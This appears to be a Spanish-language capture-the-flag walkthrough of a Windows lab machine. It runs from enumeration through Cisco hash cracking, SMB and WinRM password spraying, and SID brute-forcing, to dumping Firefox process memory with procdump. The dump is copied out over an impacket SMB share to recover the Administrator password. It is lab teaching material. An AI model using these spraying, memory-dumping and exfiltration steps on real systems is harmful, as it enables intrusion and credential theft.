-----------

# ENUMERACION

- Identificación de `SO`:
```bash
ping -c 1 10.10.10.149
```

![[ping.png]]
Como podemos ver nos devuelve un `ttl` de 127 por lo que podemos intuir que la maquina a la que nos estamos enfrentando es una maquina `Windows`.

- Identificación de puertos abiertos y exportar la salida en formato grepeable:
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.149 -oG allPorts
```

![[nmapports.png]]

- Una vez que sabemos los puertos abiertos de la maquina, el siguiente paso es la identificación de los servicios que hay corriendo detrás de cada puerto, para ello haremos un escaneo mas exhaustivo con `nmap` de la siguiente forma:
```bash
nmap -p80,135,445,5985,49669 -sCV 10.10.10.149 -oN targeted
```

![[servicesnmap.png]]

Podemos ver que tenemos un servicio `http` corriendo por el puerto 80, servicio `msrpc`, servicio de `smb` por el puerto 445 y `winrm` por el puerto 5985.

- Con la información que tenemos de primeras lo que haría seria lanzar algún escaneo que otro a la web que hay corriendo y ver que información podemos seguir rascando:
```bash
whatweb http://10.10.10.149:80/login.php
http://10.10.10.149:80/login.php [200 OK] Bootstrap[3.3.7], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.149], JQuery[3.1.1], Microsoft-IIS[10.0], PHP[7.3.1], PasswordField[login_password], Script, Title[Support Login Page], X-Powered-By[PHP/7.3.1]
```

![[login.png]]

Echando un vistazo a la web podemos observar que es un panel de login, podríamos intentar iniciar sesión con credenciales como `admin:admin` , `admin:password`, pero ya voy adelantando de que no es posible, fuerza bruta tampoco merece la pena probar por lo que vamos a ir rascando información e intentar recopilar la máxima información simplemente con el reconocimiento del sistema.

- Hay una opción de logearnos como invitados, por lo que vamos a ver que podemos ver:
![[guest.png]]

Podemos observar que hay un tal usuario `Hazard` que esta comunicando que esta experimentando una serie de problemas con su Router Cisco y no sabe como solucionarlos, adjunta un fichero y un tal `Support Admin` le responde para la solución de los problemas.

- Viendo el fichero adjunto:
![[adjunto.png]]

Como podemos ver hemos encontrado 3 hashes, el primero parece ser que es para el usuario Hazard, y los dos restantes para el usuario Rout3r y admin.

-----------------
# CRACKEO DE PASSWORDS

- Crackeo de `passwords` y creación de listas de usuarios y contraseñas:
```bash
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
```
El numero 5 indica que la contraseña esta encriptada con `MD5`.

```
username rout3r password 7 0242114B0E143F015F5D1E161713
```
El numero 7 indica que la contraseña esta cifrada con el algoritmo `Vigenere` de Cisco.

```
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
```
El numero 7 indica que la contraseña esta cifrada con el algoritmo `Vigenere` de Cisco.

- Crackeo de la primera `password`:
```bash
echo "$1$pdQG$o8nrSzsGXeaduXrjlvKc91" > hash
hashcat -m 500 -a 0 hash /usr/share/wordlists/rockyou.txt
hashcat --show hash
```

- Las dos siguientes contraseñas las vamos a descifrar con la herramienta en linea [Cisco Password Cracker](https://www.ifm.net.nz/cookbooks/passwordcracker.html) de la siguiente forma:
![[password1.png]]

![[password2.png]]

-------------
# PASSWORD SPRAYING

- Una vez con una lista hecha de todos los usuarios recopilados y contraseñas lo que podríamos hacer es probar con la herramienta `crackmapexec` dichas credenciales encontradas haciendo `password spraying` al objetivo:
```bash
cat user.txt                                        
Hazard
rout3r
admin

------

cat pass.txt 
stealth1agent
Q4)sJu\Y8qz*A3?d
$uperP@ssword

```

```bash
crackmapexec smb 10.10.10.149 -u user.txt -p pass.txt --continue-on-success
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\Hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\Hazard:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE
```

Como podemos ver una credencial es válida pero no podemos hacer nada mas que listar los recursos compartidos que hay en la maquina a través de smb, no nos podemos conectar a ellos ya lo voy adelantando y tampoco podemos usar dichas credenciales para poder conectarnos a través de `Winrm`.

--------------
# ENUMERACION DE USUARIOS A TRAVES DE RPC

En este punto lo que podemos hacer como si que nos podemos conectar a través de `rpcclient` al servicio `msrpc` es enumerar los usuarios existentes. Tenemos dos formas de hacerlo debido a que esta capado a nivel de permisos algunos comandos como el `enumdomusers`:

- Enumerar usuarios de la maquina con la herramienta `lookupsid.py` de la suite de `Impacket`:
```bash
lookupsid.py SUPPORTDESK/Hazard:stealth1agent@10.10.10.149
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```

- Enumerar de forma manual con `rpcclient`:
```bash
rpcclient -U 'hazard%stealth1agent' 10.10.10.149
# Usamos la opcion lookupnames para obtener el SID del usuario que sabemos
lookupnames Hazard
hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)
lookupnames administrator
administrator S-1-5-21-4254423774-1266059056-3197185112-500 (User: 1)
```

- Podemos buscar las cuentas a través del `SID` de la siguiente forma:
```bash
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1)
```

- Sabiendo lo anterior lo que podemos hacer es buscar cuentas de usuario haciendo fuerza bruta a los `SID` dentro de un bucle de `bash` de la siguiente forma:
```bash
for i in {1000..1050}; do rpcclient -U 'hazard%stealth1agent' 10.10.10.149 -c "lookupsids S-1-5-21-4254423774-1266059056-3197185112-$i" | grep -v unknown; done
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1)
S-1-5-21-4254423774-1266059056-3197185112-1009 SUPPORTDESK\support (1)
S-1-5-21-4254423774-1266059056-3197185112-1012 SUPPORTDESK\Chase (1)
S-1-5-21-4254423774-1266059056-3197185112-1013 SUPPORTDESK\Jason (1)
```

Como vemos también obtenemos dichos usuarios.

------------
# COMPROBACION DE WINRM NUEVOS USUARIOS

- El siguiente paso que yo haría seria hacer un `password spraying` con la herramienta `crackmapexec` de la siguiente forma para validar que usuario tiene permisos para iniciar sesión de forma remota con el servicio `Winrm`:
```bash
crackmapexec winrm 10.10.10.149 -u user.txt -p pass.txt --continue-on-success
```

Indicamos la `flag` `--continue-on-success` para que si encuentra un usuario y contraseña valido, no pare la herramienta sino que siga con el ataque.

- Encontramos el siguiente usuario valido:
```bash
WINRM       10.10.10.149    5985   SUPPORTDESK      [+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d (Pwn3d!)
```

- Por lo que vamos a iniciar sesión con la herramienta `evil-winrm` y entramos dentro de la maquina:
```bash
evil-winrm -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d'
*Evil-WinRM* PS C:\Users\Chase\Documents>
```

-------------------
# ESCALADA DE PRIVILEGIOS

 - Comprobamos los privilegios que tenemos dentro del sistema pero no podemos aprovecharnos de ninguno:
```powershell
*Evil-WinRM* PS C:\Users\Chase\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

- Como hay un servidor web y sabemos que hay un archivo llamado `login.php`, podemos ir a la ruta `inetpub\wwwroot\login.php` y comprobar dicho fichero a ver si podemos ver credenciales validas:
```php
<?php
session_start();
if( isset($_REQUEST['login']) && !empty($_REQUEST['login_username']) && !empty($_REQUEST['login_password'])) {
        if( $_REQUEST['login_username'] === 'admin@support.htb' && hash( 'sha256', $_REQUEST['login_password']) === '91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040') {
                $_SESSION['admin'] = "valid";
                header('Location: issues.php');
        }
        else
                header('Location: errorpage.php');
}
else if( isset($_GET['guest']) ) {
        if( $_GET['guest'] === 'true' ) {
                $_SESSION['guest'] = "valid";
                header('Location: issues.php');
        }
}


?>
```

Como podemos ver hay un `hash` tipo `sha256` podemos probar crackearlo con `hashcat` pero no dará ningún resultado. Por lo que dentro del directorio personal del usuario `Chase` se encuentra unas notas que nos darán una serie de pistas:
```powershell
*Evil-WinRM* PS C:\Users\Chase\Desktop> type todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
```

Dice que sigamos chequeando la lista de problemas, por lo que nos da una pista y lo que hacemos ahora es mostrar la lista de procesos activos dentro del sistema de la siguiente forma:
```powershell
Get-Process
    355      25    16400      38908       0.14   3768   1 firefox
   1069      71   150852     228100       4.91   6480   1 firefox
    347      19    10140      38660       0.06   6592   1 firefox
    401      34    35588      95024       0.53   6752   1 firefox
    378      28    23368      60468       0.23   7040   1 firefox
```

Como podemos ver hay varios procesos activos del navegador firefox por lo que es bastante raro, por lo que podemos dumpear y ver si podemos obtener credenciales:
```powershell
*Evil-WinRM* PS C:\Users\Chase\Documents> upload /home/kali/Heist/exploits/procdump64.exe .
Info: Upload successful!
```

- Ejecutamos la herramienta de la siguiente forma para el `dumpeo`:
```powershell
*Evil-WinRM* PS C:\Users\Chase\Documents> .\procdump64 -ma 6252 -accepteula
ProcDump v9.0 - Sysinternals process dump utility
Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com
[05:14:50] Dump 1 initiated: C:\Users\Chase\Documents\firefox.exe_7908054_023447.dmp
```

- Pasamos el archivo a nuestra maquina atacante para aplicarle la regex, para buscar la password:
```bash
impacket-smbserver dumpeo -smb2support $(pwd) -user test -password test
```

```powershell
net use n: \\IP\dumpeo /user:test test
move firefox.exe_7908054_023447.dmp n:\firefox.exe_7908054_023447.dmp
```

- Buscamos la password dentro del archivo:
```bash
grep -aoE 'login_username=.{1,20}@.{1,20}&login_password=.{1,50}&login=' firefox.exe_7908054_023447.dmp
```

- Encontramos dichas credenciales:
```bash
4dD!5}x/re8]FBuZ
```

- Iniciamos sesión como `Administrator con Winrm` y ya tenemos control total de la maquina:
```powersehll
evil-winrm -i 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

